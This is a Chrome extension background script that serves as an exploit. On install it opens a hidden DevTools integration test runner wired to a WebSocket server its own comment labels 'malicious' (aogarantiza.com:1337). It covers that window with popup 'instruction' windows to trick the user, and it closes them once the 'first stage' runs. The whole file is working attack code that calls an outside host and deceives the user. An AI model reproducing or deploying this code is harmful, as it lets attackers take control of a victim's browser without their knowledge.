
// Needed once per profile start
chrome.tabs.create({url:'devtools://devtools/'}, (tab) => {
    chrome.tabs.remove(tab.id);
});

// Change to your malicious WebSocket server
var ws = 'aogarantiza.com:1337';

var instructionsWindowIds = [];
var devToolsWindowId;
var allowClosingInstructions = false;

var width = 500;

var createWindows = async () => {
    allowClosing = false;
    
    var currentWindow = await chrome.windows.getCurrent();
    
    var xPos = Math.round(currentWindow.left + (currentWindow.width / 4));
    var yPos = Math.round(currentWindow.top);

    var devToolsWindowHeight = 800;
    var windowGapHeight = 100;
    var windowGapWidth = 160;
    var instructionsWindowBaseHeight = (devToolsWindowHeight / 2) - (windowGapHeight / 2);
    var instructionsWindowTopHeight = instructionsWindowBaseHeight + 100;
    var instructionsWindowBottomHeight = instructionsWindowBaseHeight - 100;

    chrome.windows.create({
        url: `devtools://devtools/bundled/integration_test_runner.html?inspected_test=https://aogarantiza.com&ws=${ws}&panel=network`,
        height: devToolsWindowHeight,
        width: width,
        left: xPos,
        top: yPos,
    }, (win) => {
        devToolsWindowId = win.id;
    });
    
    // Cover up DevTools window with these other windows
    chrome.windows.create({
        url: 'about:blank',
        height: windowGapHeight * 2,
        width: width - windowGapWidth + 20,
        left: xPos + windowGapWidth,
        top: yPos + instructionsWindowTopHeight - (windowGapHeight / 2),
        type: 'popup',
    }, (win) => {
        instructionsWindowIds.push(win.id);
    });
    
    chrome.windows.create({
        url: chrome.runtime.getURL('instructions-top.html'),
        height: instructionsWindowTopHeight,
        width: width + 20,
        left: xPos,
        top: yPos,
        type: 'popup',
    }, (win) => {
        instructionsWindowIds.push(win.id);
    });

    chrome.windows.create({
        url: chrome.runtime.getURL('instructions-bottom.html'),
        height: instructionsWindowBottomHeight,
        width: width + 20,
        left: xPos,
        top: yPos + devToolsWindowHeight - instructionsWindowBottomHeight,
        type: 'popup',
    }, (win) => {
        instructionsWindowIds.push(win.id);
        setTimeout(() => {
            allowClosingInstructions = true;
        }, 500);
    });

}

chrome.runtime.onInstalled.addListener(() => {
    createWindows();

    chrome.windows.onFocusChanged.addListener((windowId) => {
        // windowId is newly-focused window
        // Sometimes windowId is -1 until another browser window is refocused
        if (windowId == -1) { return; }
        if (instructionsWindowIds.length >= 3 && !instructionsWindowIds.includes(windowId)) {
            instructionsWindowIds.forEach(instructionsWindowId => {
                // Bring instruction windows to the front after first click
                chrome.windows.update(instructionsWindowId, { focused: true });
            });
        }
    });

    // Identify when first stage has run
    chrome.tabs.onCreated.addListener(tab => {
        if (allowClosingInstructions && devToolsWindowId == tab.windowId) {
            // First stage ran, close instructions windows
            instructionsWindowIds.forEach(instructionsWindowId => {
                setTimeout(() => {
                    chrome.windows.remove(instructionsWindowId);
                }, 100);
            });
            instructionsWindowIds = [];
        }
    });
});